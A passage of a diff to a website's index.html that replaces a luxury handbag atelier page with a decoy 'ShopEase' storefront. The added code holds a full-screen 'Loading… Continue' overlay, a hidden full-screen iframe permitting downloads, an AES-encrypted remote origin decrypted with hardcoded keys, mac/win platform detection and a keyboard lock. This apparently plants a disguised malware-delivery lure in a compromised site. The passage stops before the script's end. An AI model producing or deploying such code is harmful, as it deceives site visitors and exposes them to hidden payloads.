@@ -1,743 +1,312 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NobleBagCrest | Haute Maroquinerie & Bespoke Luxury Leathercraft Atelier</title>
-    <meta name="description" content="Discover NobleBagCrest: Handcrafted luxury leather handbags, bespoke monogramming, two-needle saddle stitching, and heirloom vegetable-tanned maroquinerie.">
-    <link rel="canonical" href="https://noblebagcrest.com/index.html">
-    <meta name="og:title" content="NobleBagCrest | Haute Maroquinerie & Bespoke Luxury Leather Atelier">
-    <meta name="og:description" content="Timeless luxury handbags, hand-burnished vegetable-tanned leathers, and custom bespoke commissions crafted by master artisans.">
-    <meta name="og:type" content="website">
-    <meta name="og:url" content="https://noblebagcrest.com/index.html">
-    <meta name="og:image" content="https://noblebagcrest.com/images/bag-hero-luxury-tote.jpg">
-    <link rel="stylesheet" href="style.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;600;700;800;900&family=Italiana&family=Montserrat:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-  gtag('config', 'G-0LY0HY7L01');
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
 </script>
+
+
 </head>
 <body>
-    <div class="top-bar">
-    <div class="container top-bar-container">
-        <div class="top-bar-item">
-            <i class="fas fa-crown"></i>
-            <span>Bespoke Haute Maroquinerie Atelier &bull; Global White-Glove Courier</span>
-        </div>
-        <div class="top-bar-item">
-            <span><i class="fas fa-location-dot"></i> Salons: New York &bull; Paris &bull; Milan &bull; London</span>
-        </div>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
     </div>
-</div>
-    <nav class="navbar" id="mainNav">
-    <div class="nav-container">
-        <a href="index.html" class="brand-logo">
-            <span class="logo-crest"><i class="fas fa-shield-halved"></i></span>
-            <span class="logo-text">NobleBag<span class="logo-accent">Crest</span></span>
-        </a>
-        <div class="nav-links" id="navLinks">
-            <a href="index.html" class="nav-link active">Home</a>
-            <a href="about.html" class="nav-link ">Heritage</a>
-            <a href="blog.html" class="nav-link ">Gazette</a>
-            <a href="contact.html" class="nav-link ">Private Salon</a>
-            <a href="contact.html" class="nav-cta-btn"><i class="fas fa-gem"></i> Bespoke</a>
-            <button class="theme-toggle-btn" id="themeToggleBtn" aria-label="Toggle theme mode">
-                <i class="fas fa-moon"></i>
-            </button>
-        </div>
-        <button class="mobile-toggle" id="mobileToggle" aria-label="Toggle navigation menu">
-            <i class="fas fa-bars"></i>
-        </button>
-    </div>
-</nav>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-    <!-- SECTION 1: HERO SECTION -->
-    <section class="hero-root">
-        <div class="container hero-grid">
-            <div class="hero-content-col">
-                <span class="hero-badge"><i class="fas fa-gem"></i> Florentine & Parisian Heritage &bull; Est. 1894</span>
-                <h1 class="hero-title">Haute Maroquinerie For The <span class="text-gold text-accent">Discerning Patron</span></h1>
-                <p class="hero-subhead">NobleBagCrest engineers pure structural elegance. Every handbag is individually cut from full-grain Tuscan hides, bound with hand-waxed linen saddle stitching, and crowned with 24K gold-plated solid brass hardware.</p>
-                <div class="hero-actions">
-                    <a href="#capsule-curator" class="btn btn-primary"><i class="fas fa-bag-shopping"></i> Explore Capsule Editions</a>
-                    <a href="#patina-simulator" class="btn btn-outline"><i class="fas fa-sliders"></i> Test Patina Aging</a>
-                </div>
-                <div class="hero-stats-row">
-                    <div class="stat-item">
-                        <h3>48+</h3>
-                        <p>Artisanal Craft Hours</p>
-                    </div>
-                    <div class="stat-item">
-                        <h3>100%</h3>
-                        <p>Vegetable-Tanned</p>
-                    </div>
-                    <div class="stat-item">
-                        <h3>Lifetime</h3>
-                        <p>Structural Warranty</p>
-                    </div>
-                </div>
-            </div>
-            <div class="hero-media-wrapper">
-                <div class="hero-main-img-card">
-                    <img src="images/bag-hero-luxury-tote.jpg" alt="NobleBagCrest Haute Maroquinerie Signature Tote" loading="eager">
-                    <div class="floating-heritage-seal">
-                        <div class="seal-icon"><i class="fas fa-award"></i></div>
-                        <div class="seal-text">
-                            <h4>Master Artisan Sealed</h4>
-                            <p>Individually numbered & registered in Florence</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
     </section>
 
-    <!-- SECTION 2: 4 PILLARS OF HAUTE MAROQUINERIE -->
-    <section class="section-py section-darker" id="craft-pillars">
-        <div class="container">
-            <div class="section-header">
-                <span class="section-tag"><i class="fas fa-compass-drafting"></i> The Atelier Standard</span>
-                <h2 class="section-title">Four Pillars of Noble Craftsmanship</h2>
-                <p class="section-desc">Our master maroquiniers reject industrialized automation. Every silhouette honors centuries of European leatherworking heritage.</p>
-            </div>
-            <div class="pillars-grid">
-                <div class="pillar-card">
-                    <div class="pillar-num">01</div>
-                    <div class="pillar-icon"><i class="fas fa-seedling"></i></div>
-                    <h3>Tuscan Vegetable Tanning</h3>
-                    <p>Slowly cured for sixty days in natural chestnut and mimosa bark tannins, creating breathable leather that deepens in character year after year.</p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-num">02</div>
-                    <div class="pillar-icon"><i class="fas fa-crosshairs"></i></div>
-                    <h3>Two-Needle Saddle Stitch</h3>
-                    <p>Hand-sewn with double awl perforations and beeswax-coated French linen thread. Each stitch forms an unbreakable mechanical knot.</p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-num">03</div>
-                    <div class="pillar-icon"><i class="fas fa-ring"></i></div>
-                    <h3>Goldsmith-Cast Hardware</h3>
-                    <p>Milled from solid billet brass and finished with 3-micron 24K gold or palladium electroplating, resisting tarnishing across generations.</p>
-                </div>
-                <div class="pillar-card">
-                    <div class="pillar-num">04</div>
-                    <div class="pillar-icon"><i class="fas fa-layer-group"></i></div>
-                    <h3>Seven-Layer Edge Inking</h3>
-                    <p>Edges are bevelled, hand-painted with organic edge lacquer, heated with iron filleting creasers, and hand-buffed to a glass-smooth finish.</p>
-                </div>
-            </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
     </section>
 
-    <!-- SECTION 3: INTERACTIVE ATELIER CAPSULE CURATOR -->
-    <section class="section-py" id="capsule-curator">
-        <div class="container">
-            <div class="section-header">
-                <span class="section-tag"><i class="fas fa-boxes-stacked"></i> Curated Silhouettes</span>
-                <h2 class="section-title">The Atelier Capsule Gallery</h2>
-                <p class="section-desc">Explore masterwork editions crafted in limited numbered micro-batches of twelve pieces per seasonal cycle.</p>
-            </div>
-            <div class="filter-nav">
-                <button class="filter-btn active" data-filter="all">All Silhouettes</button>
-                <button class="filter-btn" data-filter="totes">Signature Totes</button>
-                <button class="filter-btn" data-filter="crossbody">Structured Crossbody</button>
-                <button class="filter-btn" data-filter="satchel">Executive Satchels</button>
-                <button class="filter-btn" data-filter="evening">Evening Miniatures</button>
-            </div>
-            <div class="capsule-grid">
-                <!-- Item 1 -->
-                <div class="capsule-card" data-category="totes">
-                    <div class="capsule-img-box">
-                        <img src="images/bag-hero-luxury-tote.jpg" alt="The Sovereign Grand Tote in Cognac Calfskin" loading="lazy">
-                        <span class="capsule-tag-badge">Signature Edition</span>
-                    </div>
-                    <div class="capsule-info">
-                        <p class="capsule-meta">Full-Grain Vachetta Leather</p>
-                        <h3 class="capsule-title">The Sovereign Grand Tote</h3>
-                        <p class="capsule-desc">Engineered with reinforced double gussets, raw edge glazing, and a plush Italian velour pigskin interior lining.</p>
-                        <div class="capsule-spec-row">
-                            <span><i class="fas fa-clock"></i> 52 Craft Hours</span>
-                            <span><i class="fas fa-fingerprint"></i> Numbered 01/12</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Item 2 -->
-                <div class="capsule-card" data-category="crossbody">
-                    <div class="capsule-img-box">
-                        <img src="images/bag-cognac-crossbody.jpg" alt="The Aurelia Saddle Crossbody" loading="lazy">
-                        <span class="capsule-tag-badge">Heritage Equestrian</span>
-                    </div>
-                    <div class="capsule-info">
-                        <p class="capsule-meta">French Barenia Calfskin</p>
-                        <h3 class="capsule-title">The Aurelia Saddle Crossbody</h3>
-                        <p class="capsule-desc">Inspired by classical equestrian carriage saddlebags, featuring a magnetic solid brass shield lock and adjustable shoulder strap.</p>
-                        <div class="capsule-spec-row">
-                            <span><i class="fas fa-clock"></i> 38 Craft Hours</span>
-                            <span><i class="fas fa-fingerprint"></i> Numbered 04/12</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Item 3 -->
-                <div class="capsule-card" data-category="satchel">
-                    <div class="capsule-img-box">
-                        <img src="images/bag-black-leather-handbag.jpg" alt="The Monarch Executive Satchel" loading="lazy">
-                        <span class="capsule-tag-badge">Structured Noir</span>
-                    </div>
-                    <div class="capsule-info">
-                        <p class="capsule-meta">Box Calfskin &bull; Obsidian Black</p>
-                        <h3 class="capsule-title">The Monarch Executive Satchel</h3>
-                        <p class="capsule-desc">Architectural rigidity achieved through layered vegetable-stiffened salpa cores and hand-stitched top handle arches.</p>
-                        <div class="capsule-spec-row">
-                            <span><i class="fas fa-clock"></i> 64 Craft Hours</span>
-                            <span><i class="fas fa-fingerprint"></i> Numbered 02/12</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Item 4 -->
-                <div class="capsule-card" data-category="evening">
-                    <div class="capsule-img-box">
-                        <img src="images/bag-burgundy-clutch.jpg" alt="The Vendôme Royal Clutch" loading="lazy">
-                        <span class="capsule-tag-badge">Couture Evening</span>
-                    </div>
-                    <div class="capsule-info">
-                        <p class="capsule-meta">Royal Burgundy Chevre Goat</p>
-                        <h3 class="capsule-title">The Vendôme Royal Clutch</h3>
-                        <p class="capsule-desc">Sensual textured chevre grain paired with a 24K gold guilloché engraved clasp and removable link chain strap.</p>
-                        <div class="capsule-spec-row">
-                            <span><i class="fas fa-clock"></i> 26 Craft Hours</span>
-                            <span><i class="fas fa-fingerprint"></i> Numbered 08/12</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Item 5 -->
-                <div class="capsule-card" data-category="satchel">
-                    <div class="capsule-img-box">
-                        <img src="images/bag-designer-satchel-model.jpg" alt="The Astrid Top Handle Promenade" loading="lazy">
-                        <span class="capsule-tag-badge">Limited Atelier</span>
-                    </div>
-                    <div class="capsule-info">
-                        <p class="capsule-meta">Epsom Textured Calf</p>
-                        <h3 class="capsule-title">The Astrid Promenade</h3>
-                        <p class="capsule-desc">Scratch-resistant embossed grain with a structured accordion base and palladium turn-lock closure mechanism.</p>
-                        <div class="capsule-spec-row">
-                            <span><i class="fas fa-clock"></i> 46 Craft Hours</span>
-                            <span><i class="fas fa-fingerprint"></i> Numbered 05/12</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Item 6 -->
-                <div class="capsule-card" data-category="evening">
-                    <div class="capsule-img-box">
-                        <img src="images/bag-couture-evening-pouch.jpg" alt="The Celeste Velvet-Calf Minaudière" loading="lazy">
-                        <span class="capsule-tag-badge">Private Commission</span>
-                    </div>
-                    <div class="capsule-info">
-                        <p class="capsule-meta">Nappa Lambskin &bull; Gold Trim</p>
-                        <h3 class="capsule-title">The Celeste Minaudière</h3>
-                        <p class="capsule-desc">Molded wooden inner skeleton wrapped in buttery nappa leather and lined with pure crimson Lyon silk jacquard.</p>
-                        <div class="capsule-spec-row">
-                            <span><i class="fas fa-clock"></i> 34 Craft Hours</span>
-                            <span><i class="fas fa-fingerprint"></i> Numbered 11/12</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
     </section>
 
-    <!-- SECTION 4: THE 7-STEP MAROQUINIER CRAFTSMANSHIP SYMPHONY -->
-    <section class="section-py section-darker" id="craftsmanship-steps">
-        <div class="container">
-            <div class="section-header">
-                <span class="section-tag"><i class="fas fa-hammer"></i> The Artisanal Symphony</span>
-                <h2 class="section-title">Seven Stages of Haute Maroquinerie</h2>
-                <p class="section-desc">Witness the uncompromising steps every NobleBagCrest creation traverses before earning its institutional wax seal.</p>
-            </div>
-            <div class="timeline-steps-grid">
-                <div class="step-card">
-                    <div class="step-header-row">
-                        <span class="step-badge">1</span>
-                        <i class="fas fa-eye text-gold"></i>
-                    </div>
-                    <h4>Florentine Hide Selection</h4>
-                    <p>Only top 2% grade-A French and Italian calf hides are selected, inspected under raking light for natural grain purity.</p>
-                </div>
-                <div class="step-card">
-                    <div class="step-header-row">
-                        <span class="step-badge">2</span>
-                        <i class="fas fa-scissors text-gold"></i>
-                    </div>
-                    <h4>Manual Hand-Clicking</h4>
-                    <p>Artisans hand-cut every panel along the leather's natural stretch lines using razor-sharp crescent blades.</p>
-                </div>
-                <div class="step-card">
-                    <div class="step-header-row">
-                        <span class="step-badge">3</span>
-                        <i class="fas fa-ruler-combined text-gold"></i>
-                    </div>
-                    <h4>Micro-Skiving & Feathering</h4>
-                    <p>Leather edges are skived down to 0.4mm tolerances to ensure seamless multi-layer seams without bulk.</p>
-                </div>
-                <div class="step-card">
-                    <div class="step-header-row">
-                        <span class="step-badge">4</span>
-                        <i class="fas fa-wand-magic-sparkles text-gold"></i>
-                    </div>
-                    <h4>Two-Needle Saddle Stitch</h4>
-                    <p>Hand-stitched on wooden clam vises, waxing each linen thread strand with organic beeswax for moisture defense.</p>
-                </div>
-                <div class="step-card">
-                    <div class="step-header-row">
-                        <span class="step-badge">5</span>
-                        <i class="fas fa-paintbrush text-gold"></i>
-                    </div>
-                    <h4>Seven-Coat Edge Burnishing</h4>
-                    <p>Layers of mineral pigment are applied, sanded with fine emery paper, and hot-ironed to seal the leather fibers.</p>
-                </div>
-                <div class="step-card">
-                    <div class="step-header-row">
-                        <span class="step-badge">6</span>
-                        <i class="fas fa-cube text-gold"></i>
-                    </div>
-                    <h4>Solid Brass Hardware Assembly</h4>
-                    <p>Goldsmith-cast turn locks, feet studs, and O-rings are hand-riveted with internal carbon fiber reinforcements.</p>
-                </div>
-                <div class="step-card">
-                    <div class="step-header-row">
-                        <span class="step-badge">7</span>
-                        <i class="fas fa-stamp text-gold"></i>
-                    </div>
-                    <h4>Master Ingot & Archival Registration</h4>
-                    <p>The artisan strikes their unique hallmark into the inner pocket and enters the bag into our Madison Avenue archive.</p>
-                </div>
-            </div>
-        </div>
-    </section>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-    <!-- SECTION 5: INTERACTIVE LEATHER TANNERY & PATINA SIMULATOR -->
-    <section class="section-py" id="patina-simulator">
-        <div class="container">
-            <div class="section-header">
-                <span class="section-tag"><i class="fas fa-sliders"></i> Living Organic Material</span>
-                <h2 class="section-title">The Natural Patina Aging Simulator</h2>
-                <p class="section-desc">Vegetable-tanned leather is alive. Slide below to preview how exposure to sunlight, hand oils, and natural atmosphere transforms raw hide into a deep, glossy caramel heirloom.</p>
-            </div>
-            <div class="patina-simulator-box">
-                <div class="patina-visual-frame">
-                    <img src="images/bag-cognac-crossbody.jpg" alt="NobleBagCrest Patina Simulation Preview" id="patinaImg">
-                    <div class="patina-badge-overlay">
-                        <span class="text-gold" id="patinaAgeLabel">0 Years (Fresh from Atelier)</span>
-                    </div>
-                </div>
-                <div class="patina-controls-pane">
-                    <h3>Explore Patina Evolution</h3>
-                    <p>Unlike plastic-coated synthetic alternatives that peel and crack, authentic full-grain vegetable leather absorbs its environment, developing a rich caramel sheen that tells your personal life story.</p>
-                    
-                    <div class="leather-type-selectors">
-                        <button class="leather-opt-btn active">Tuscan Vachetta</button>
-                        <button class="leather-opt-btn">Box Calfskin</button>
-                        <button class="leather-opt-btn">Epsom Grain</button>
-                        <button class="leather-opt-btn">Barenia Saddle</button>
-                    </div>
 
-                    <div class="slider-container">
-                        <div class="slider-label-row">
-                            <span>Fresh Atelier Hide</span>
-                            <span>Vintage Heirloom (10 Years)</span>
-                        </div>
-                        <input type="range" min="0" max="10" value="0" class="range-slider" id="patinaSlider" aria-label="Patina Age Slider">
-                    </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-                    <div class="patina-facts">
-                        <p><i class="fas fa-shield-check text-gold"></i> <strong>Natural Tannins:</strong> Mimosa, oak, and chestnut bark protect fibers from UV degradation.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+ZV4B4shIyEYopUetzDlM8rBCY07decV0ugFl6IZehLUPZK3pNzYk+";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-    <!-- SECTION 6: GOLDSMITHING & SOLID BRASS HARDWARE BENCH -->
-    <section class="section-py section-darker" id="hardware-bench">
-        <div class="container hardware-grid">
-            <div class="hardware-media-col">
-                <img src="images/bag-gold-hardware-detail.jpg" alt="Solid Brass 24K Gold Plated Turn Lock Details" class="hero-main-img-card">
-            </div>
-            <div class="hardware-info-col">
-                <span class="section-tag"><i class="fas fa-gem"></i> Metallurgical Mastery</span>
-                <h2 class="section-title">Goldsmith-Engineered Hardware</h2>
-                <p class="section-desc">A handbag is only as durable as its mechanical closures. We forge every clasp, rivet, and buckle in solid brass rather than cheap die-cast zinc alloys.</p>
-                <div class="hardware-features-list">
-                    <div class="hardware-feature-item">
-                        <div class="hw-icon-box"><i class="fas fa-lock"></i></div>
-                        <div class="hw-text-box">
-                            <h4>Precision Turn-Lock Barrels</h4>
-                            <p>Machined to 0.02mm tolerance with internal stainless steel leaf springs providing a satisfying, tactile click.</p>
-                        </div>
-                    </div>
-                    <div class="hardware-feature-item">
-                        <div class="hw-icon-box"><i class="fas fa-shield-halved"></i></div>
-                        <div class="hw-text-box">
-                            <h4>3-Micron 24K Gold Electroplating</h4>
-                            <p>Triple the industry standard thickness, ensuring hardware will not peel or discolour when exposed to humidity.</p>
-                        </div>
-                    </div>
-                    <div class="hardware-feature-item">
-                        <div class="hw-icon-box"><i class="fas fa-circle-dot"></i></div>
-                        <div class="hw-text-box">
-                            <h4>Hand-Lathed Base Studs</h4>
-                            <p>Four solid brass feet protect the base leather from surface friction when rested on salon marble or teak wood.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-    <!-- SECTION 7: BESPOKE MONOGRAMMING STUDIO -->
-    <section class="section-py" id="monogram-studio">
-        <div class="container">
-            <div class="section-header">
-                <span class="section-tag"><i class="fas fa-font"></i> Personal Heraldry</span>
-                <h2 class="section-title">Bespoke Monogramming Studio</h2>
-                <p class="section-desc">Personalize your bespoke commission with traditional hot-foil stamping executed by our master brass typesetters.</p>
-            </div>
-            <div class="monogram-studio-box">
-                <div class="monogram-preview-canvas">
-                    <div class="live-emboss-text" id="liveMonogramText">NBC</div>
-                    <span class="text-gold" style="font-size:0.75rem; letter-spacing:0.15em; text-transform:uppercase; margin-top:14px;">Hot Foil Stamped in Florence</span>
-                </div>
-                <div class="monogram-inputs-pane">
-                    <h3>Customize Your Initials</h3>
-                    <p>Choose up to 4 characters to be struck into your leather clochette or inner crest badge using vintage Gutenberg brass type.</p>
-                    
-                    <div class="form-group-row">
-                        <label for="monogramInput">Enter Initials (1 to 4 letters)</label>
-                        <input type="text" id="monogramInput" class="custom-text-input" placeholder="NBC" maxlength="4">
-                    </div>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-                    <div class="form-group-row">
-                        <label>Select Foil Stamping Finish</label>
-                        <div class="foil-options-row">
-                            <button class="foil-btn active" data-foil="gold"><i class="fas fa-circle text-gold"></i> 24K Gold Foil</button>
